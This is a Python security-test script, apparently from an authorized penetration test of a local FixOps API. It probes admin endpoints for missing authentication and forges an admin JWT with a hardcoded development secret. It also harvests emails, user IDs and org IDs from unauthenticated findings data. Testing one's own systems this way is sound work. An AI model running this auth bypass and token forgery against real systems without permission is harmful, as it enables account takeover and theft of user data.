#!/usr/bin/env python3
"""
Security test script for AUTH-VULN-01/02/03 and related checks.
Authorized security test environment.
"""

import requests
import json
import time
import jwt as pyjwt

BASE_URL = "http://host.docker.internal:8000"

def print_section(title):
    print("\n" + "="*70)
    print(f"  {title}")
    print("="*70)

def print_result(label, status_code, body):
    print(f"\n[{label}]")
    print(f"  Status: {status_code}")
    body_str = body[:500] if len(body) > 500 else body
    print(f"  Body:   {body_str}")

def print_result_long(label, status_code, body):
    print(f"\n[{label}]")
    print(f"  Status: {status_code}")
    body_str = body[:1000] if len(body) > 1000 else body
    print(f"  Body:   {body_str}")

def do_get(url, headers=None):
    try:
        r = requests.get(url, headers=headers, timeout=10)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)

def do_post(url, data=None, headers=None):
    try:
        h = {"Content-Type": "application/json"}
        if headers:
            h.update(headers)
        r = requests.post(url, json=data, headers=h, timeout=10)
        return r.status_code, r.text
    except Exception as e:
        return None, str(e)


# ============================================================
# TASK 1: Unauthenticated admin bypass
# ============================================================
print_section("TASK 1: Unauthenticated Admin Bypass (AUTH-VULN-01/02/03)")

endpoints_task1 = [
    "/api/v1/users",
    "/api/v1/admin/users",
    "/api/v1/tenants",
    "/api/v1/users/me",
]

print("\n--- No auth header at all ---")
for ep in endpoints_task1:
    url = BASE_URL + ep
    code, body = do_get(url)
    print_result(f"GET {ep} [no auth]", code, body)

print("\n--- Empty Authorization header ---")
for ep in endpoints_task1:
    url = BASE_URL + ep
    code, body = do_get(url, headers={"Authorization": ""})
    print_result(f"GET {ep} [Authorization: '']", code, body)

print("\n--- 'Bearer' with no token ---")
for ep in endpoints_task1:
    url = BASE_URL + ep
    code, body = do_get(url, headers={"Authorization": "Bearer"})
    print_result(f"GET {ep} [Authorization: Bearer]", code, body)


# ============================================================
# TASK 2: Unauthenticated endpoints from recon
# ============================================================
print_section("TASK 2: Unauthenticated Endpoints from Recon")

unauthenticated_gets = [
    "/api/v1/findings",
    "/api/v1/findings/summary",
    "/api/v1/auth/sso",
    "/api/v1/scanner-ingest/stats",
    "/api/v1/graphql/schema",
]

for ep in unauthenticated_gets:
    url = BASE_URL + ep
    code, body = do_get(url)
    print_result_long(f"GET {ep}", code, body)

# POST SSO endpoint
sso_payload = {
    "name": "test",
    "provider_type": "oidc",
    "client_id": "test",
    "client_secret": "test",
    "discovery_url": "https://example.com/.well-known/openid-configuration"
}
code, body = do_post(BASE_URL + "/api/v1/auth/sso", data=sso_payload)
print_result_long("POST /api/v1/auth/sso", code, body)


# ============================================================
# TASK 3: JWT Forgery
# ============================================================
print_section("TASK 3: JWT Forgery with HS256 Secret")

secret = 'fixops-dev-secret-change-in-production'
now = int(time.time())

payload = {
    "user_id": "fresh-test-9991",
    "email": "fresh9991@newtest.com",
    "role": "admin",
    "scopes": ["admin:all"],
    "jti": "fresh-jti-9991",
    "iat": now,
    "exp": now + 86400,
}

forged_token = pyjwt.encode(payload, secret, algorithm="HS256")
print(f"\nForged JWT token (HS256):")
print(f"  {forged_token[:80]}...")
print(f"\nPayload: {json.dumps(payload, indent=2)}")

task3_endpoints = [
    "/api/v1/tenants",
    "/api/v1/admin/users",
    "/api/v1/users/me",
]

for ep in task3_endpoints:
    print(f"\n  [3 second delay before request...]")
    time.sleep(3)
    url = BASE_URL + ep
    code, body = do_get(url, headers={"Authorization": f"Bearer {forged_token}"})
    print_result_long(f"GET {ep} [forged JWT]", code, body)


# ============================================================
# TASK 4: Scan for existing users from findings data
# ============================================================
print_section("TASK 4: Extract User/Org Data from Findings")

# Re-fetch findings with extended body
try:
    r = requests.get(BASE_URL + "/api/v1/findings", timeout=10)
    code = r.status_code
    body = r.text
    print(f"\nGET /api/v1/findings — Status: {code}")
    print(f"Full response length: {len(body)} chars")

    if code == 200:
        try:
            data = r.json()
            print(f"\nParsed JSON structure (type={type(data).__name__}):")
            if isinstance(data, list):
                print(f"  List with {len(data)} items")
                if data:
                    print(f"  First item keys: {list(data[0].keys()) if isinstance(data[0], dict) else 'n/a'}")
                    # Extract user/org identifiers
                    emails = set()
                    user_ids = set()
                    org_ids = set()
                    for item in data:
                        if isinstance(item, dict):
                            for k, v in item.items():
                                if 'email' in k.lower() and v:
                                    emails.add(str(v))
                                if 'user_id' in k.lower() and v:
                                    user_ids.add(str(v))
                                if 'org_id' in k.lower() or 'tenant' in k.lower():
                                    if v:
                                        org_ids.add(str(v))
                    print(f"\n  Extracted emails:   {emails or 'none found'}")
                    print(f"  Extracted user_ids: {user_ids or 'none found'}")
                    print(f"  Extracted org_ids:  {org_ids or 'none found'}")
            elif isinstance(data, dict):
                print(f"  Dict keys: {list(data.keys())}")
                print(f"  Content (first 1000 chars): {json.dumps(data)[:1000]}")
        except json.JSONDecodeError:
            print(f"  Response is not JSON. Raw (first 500): {body[:500]}")
    else:
        print(f"  Response: {body[:500]}")
except Exception as e:
    print(f"  Error: {e}")

# Also check findings/summary
try:
    r = requests.get(BASE_URL + "/api/v1/findings/summary", timeout=10)
    code = r.status_code
    body = r.text
    print(f"\nGET /api/v1/findings/summary — Status: {code}")
    if code == 200:
        try:
            data = r.json()
            print(f"  Content: {json.dumps(data, indent=2)[:1000]}")
        except:
            print(f"  Raw: {body[:500]}")
    else:
        print(f"  Response: {body[:500]}")
except Exception as e:
    print(f"  Error: {e}")

print_section("ALL TASKS COMPLETE")
